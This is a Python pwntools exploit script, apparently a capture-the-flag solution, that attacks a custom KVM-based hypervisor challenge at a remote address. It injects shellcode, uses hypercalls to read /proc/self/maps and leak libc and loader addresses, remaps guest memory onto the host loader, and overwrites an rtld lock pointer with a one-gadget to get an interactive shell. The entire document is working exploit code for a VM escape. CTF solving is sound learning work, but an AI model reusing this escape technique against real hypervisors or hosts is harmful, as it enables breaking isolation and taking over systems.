#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './user.elf'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':'./hypervisor.elf kernel.bin ld.so.2'.split()+[bin_file], 'aslr':False}, \
                        local   = {'argv':'./hypervisor.elf kernel.bin ld.so.2'.split()+[bin_file]}, \
                        remote  = {'host':'35.200.23.198', 'port':31733})
env.select()

#==========

binf = ELF(bin_file)
offset_plt_write    = binf.plt['write']
offset_s            = 0x2030a4

libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so')
offset_libc_onegadget   = 0xe569f

ld   = ELF('/lib/x86_64-linux-gnu/ld-2.27.so')
offset_ld_rtld_global   = ld.symbols['_rtld_global']
offset_ld_fp_lock       = offset_ld_rtld_global + 0xeff     # rtld_lock_default_lock_recursive

constants.KVM_SET_USER_MEMORY_REGION = 0x4020AE46

#==========

def attack(conn):
    shellasm  = shellcraft.mmap(0, 0x1000000, 'PROT_READ | PROT_WRITE | PROT_EXEC', 'MAP_PRIVATE | MAP_ANONYMOUS', -1, 0)
    shellasm  = '\n'.join(shellasm.split('\n')[:-4])
    shellasm += '''
    push SYS_mmap-1
    pop rax
    inc rax
    syscall
    '''
    shellasm += shellcraft.read('STDIN_FILENO', 'rax', 0x1000000)

    exploit_st1  = '30_\\@{}+@@,'.format((offset_s + 0x10) - (offset_plt_write + 6)).ljust(0x10, '\x90')
    exploit_st1 += asm(shellasm)

    shellasm  = '''
    lea  rdi, [rip+filepath]
    call hc_open

    mov  rdi, rax
    xor  rsi, rsi
    mov  rdx, 0x1000
    call hc_read

    mov  rdi, 1
    xor  rsi, rsi
    mov  rdx, rax
    call hc_write

    mov  rdi, 0
    mov  rsi, 0x100
    mov  rdx, 0x20
    call hc_read

    mov  rdi, 4
    mov  rsi, {0}
    mov  rdx, 0x100
    call hc_ioctl

    call extend_paging

    mov  rdi, 0
    xor  rsi, rsi
    mov  rdx, 8
    call hc_read
    mov rax, [0]
    mov [0x8002000000 + {1} + 1], rax

    hlt

    extend_paging:
        mov rax, cr3
        add rax, 0x4000
        mov rdx, 0x10 /* i */
      loop:
        cmp rdx, 0x20
        je break
        /* pd[i] = PDE64_PRESENT | PDE64_RW | PDE64_PS | (i * KERNEL_PAGING_SIZE); */
        mov rdi, rdx
        imul rdi, 8
        mov rcx, rax
        add rcx, rdi
        mov rdi, rdx
        imul rdi, 0x200000
        or rdi, 1|(1<<1)|(1<<7)
        mov qword ptr [rcx], rdi
        inc rdx
        jmp loop
      break:
        ret

    hc_open:
        mov eax, edi
        mov dx, 0x8000
        jmp hypercall
    hc_read:
        call set_args
        mov  dx, 0x8001
        jmp  hypercall
    hc_write:
        call set_args
        mov  dx, 0x8002
        jmp  hypercall
    hc_ioctl:
        call set_args
        mov  dx, 0x8008
        jmp  hypercall
    hc_panic:
        mov  eax, edi
        mov  dx, 0xffff
        jmp  hypercall
    hypercall:
        out dx, eax
        in  eax, dx
        ret
    set_args:
        lea rax, [rip+buf]
        mov qword ptr [rax+0x00], rdi
        mov qword ptr [rax+0x08], rsi
        mov qword ptr [rax+0x10], rdx
        ret

    filepath:
        .string "/proc/self/maps"
    buf:
    '''.format(constants.KVM_SET_USER_MEMORY_REGION, offset_ld_fp_lock)
    exploit_st2 = asm(shellasm)

    conn.sendlineafter('down.\n', exploit_st1)
    conn.send('\x90'*0x1000+exploit_st2)

    maps = conn.recvuntil('[vsyscall]').split('\n')
    libc.address = int(filter(lambda x : 'libc-2.27.so' in x, maps)[0].split('-')[0], 16)
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_onegadget     = libc.address + offset_libc_onegadget

    ld.address = int(filter(lambda x : 'ld-2.27.so' in x, maps)[0].split('-')[0], 16)
    info('addr_ld_base      = 0x{:08x}'.format(ld.address))

    region  = p32(1)            # slot
    region += p32(0)            # flags
    region += p64(0x2000000)    # guest_phys_addr
    region += p64(0x2000000)    # memory_size
    region += p64(ld.address)   # userspace_addr
    conn.send(region)
    conn.send(p64(addr_libc_onegadget))

#==========

if __name__=='__main__':
    conn = communicate(env.mode, **env.target)
    attack(conn)
    conn.interactive()
    
#==========
